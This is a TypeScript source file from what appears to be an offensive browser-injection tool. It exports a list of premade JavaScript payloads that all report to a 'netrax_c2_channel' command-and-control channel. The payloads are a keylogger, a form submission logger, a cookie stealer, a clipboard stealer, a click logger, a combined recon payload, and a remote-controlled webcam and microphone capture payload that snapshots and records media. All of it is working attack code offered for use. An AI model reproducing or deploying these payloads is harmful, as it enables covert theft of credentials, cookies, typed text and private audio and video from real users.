
import type { JsPayload } from '@/components/javascript-library';

export const PREMADE_PAYLOADS: JsPayload[] = [
    {
        name: "Basic Keylogger",
        description: "Captures and exfiltrates every key pressed by the user.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    document.addEventListener('keydown', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'keystroke',
            data: { key: e.key, target: e.target.name || e.target.id || e.target.tagName },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "Form Submission Logger",
        description: "Intercepts all form submissions on the page and sends the captured data.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        channel.postMessage({
            sessionId: sessionId, type: 'form-submit', data: { data },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "Cookie Stealer",
        description: "Grabs all non-HttpOnly cookies from the document and exfiltrates them.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    const cookies = document.cookie;
    if (cookies) {
        channel.postMessage({
            sessionId: sessionId, type: 'cookie-stealer', data: { cookies: cookies },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }
})();
`.trim(),
    },
    {
        name: "Clipboard Stealer",
        description: "Reads the content of the user's clipboard when they paste into the page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    document.addEventListener('paste', async (e) => {
        const text = await navigator.clipboard.readText();
        channel.postMessage({
            sessionId: sessionId, type: 'clipboard-read', data: { pastedText: text },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
     {
        name: "Click Logger",
        description: "Logs every click on the page, including coordinates and the clicked element.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
     document.addEventListener('click', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'click', 
            data: { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "Full Recon Payload",
        description: "The default payload that captures keystrokes, clicks, mouse movement, and form submissions.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        const payload = {
            sessionId: sessionId, type: type, data: data,
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        };
        channel.postMessage(payload);
    }

    exfiltrate('connection', { message: 'Payload activated on page.' });

    document.addEventListener('keydown', (e) => {
        exfiltrate('keystroke', { key: e.key, target: e.target.name || e.target.id || e.target.tagName });
    }, true);

    document.addEventListener('click', (e) => {
        exfiltrate('click', { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName });
    }, true);

    let lastMove = 0;
    document.addEventListener('mousemove', (e) => {
        if (Date.now() - lastMove > 200) {
            exfiltrate('mousemove', { x: e.clientX, y: e.clientY });
            lastMove = Date.now();
        }
    });

    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        exfiltrate('form-submit', { data });
    }, true);
})();
`.trim(),
    },
    {
        name: "Device Access & C2",
        description: "Requests webcam/mic access and listens for C2 commands to stream media.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    let mediaStream = null;
    let videoRecorder = null;
    let audioRecorder = null;
    let snapshotInterval = null;

    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    function blobToDataURL(blob) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onloadend = () => resolve(reader.result);
            reader.onerror = reject;
            reader.readAsDataURL(blob);
        });
    }

    async function getMediaPermissions(video = true, audio = true) {
        try {
            if (mediaStream && mediaStream.active) {
                // If a stream exists, stop its tracks before getting a new one
                mediaStream.getTracks().forEach(track => track.stop());
            }
            mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
            exfiltrate('media-stream', { type: 'status', message: 'Permissions granted.' });
            return mediaStream;
        } catch (err) {
            exfiltrate('media-stream', { type: 'status', message: 'Permissions denied: ' + err.name });
            return null;
        }
    }

    function startSnapshotting(stream) {
        if (snapshotInterval) clearInterval(snapshotInterval);
        const videoTrack = stream.getVideoTracks()[0];
        if (!videoTrack) return;
        const imageCapture = new ImageCapture(videoTrack);

        snapshotInterval = setInterval(async () => {
            try {
                if(stream.active && stream.getVideoTracks()[0].readyState === 'live') {
                    const blob = await imageCapture.takePhoto();
                    const dataUrl = await blobToDataURL(blob);
                    exfiltrate('media-stream', { type: 'image-snapshot', snapshot: dataUrl });
                }
            } catch (e) {
                // Ignore errors if the stream is closed
            }
        }, 500); // Send snapshot every 500ms
    }

    function stopSnapshotting() {
        if (snapshotInterval) {
            clearInterval(snapshotInterval);
            snapshotInterval = null;
        }
    }
    
    function createRecorder(stream, mimeType) {
        let recordedChunks = [];
        const recorder = new MediaRecorder(stream, { mimeType });
        
        recorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        recorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            const dataUrl = await blobToDataURL(blob);
            exfiltrate('media-stream', { type: mimeType, dataUrl });
            recordedChunks = [];
        };
        return recorder;
    }

    channel.addEventListener('message', async (event) => {
        if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
        
        const { command } = event.data;
        
        if (command === 'start-video') {
            const stream = await getMediaPermissions(true, true);
            if (stream) startSnapshotting(stream);
            return;
        }

        if (command === 'start-mic') {
            await getMediaPermissions(false, true);
            return;
        }

        if (!mediaStream || !mediaStream.active) {
             exfiltrate('media-stream', { type: 'status', message: 'No active media stream.' });
             return;
        }
        
        switch (command) {
            case 'capture-image':
                const videoTrack = mediaStream.getVideoTracks()[0];
                if (videoTrack) {
                    const imageCapture = new ImageCapture(videoTrack);
                    const blob = await imageCapture.takePhoto();
                    const dataUrl = await blobToDataURL(blob);
                    exfiltrate('media-stream', { type: 'image/png', dataUrl });
                }
                break;
            case 'start-video-record':
                if (mediaStream.getVideoTracks().length > 0) {
                    videoRecorder = createRecorder(mediaStream, 'video/webm');
                    videoRecorder.start();
                }
                break;
            case 'stop-video-record':
                if (videoRecorder) videoRecorder.stop();
                break;
            case 'start-audio-record':
                 if (mediaStream.getAudioTracks().length > 0) {
                    audioRecorder = createRecorder(mediaStream, 'audio/webm');
                    audioRecorder.start();
                }
                break;
            case 'stop-audio-record':
                if (audioRecorder) audioRecorder.stop();
                break;
        }
    });

    exfiltrate('connection', { message: 'Device Access Payload loaded.' });
})();
`.trim(),
    }
];
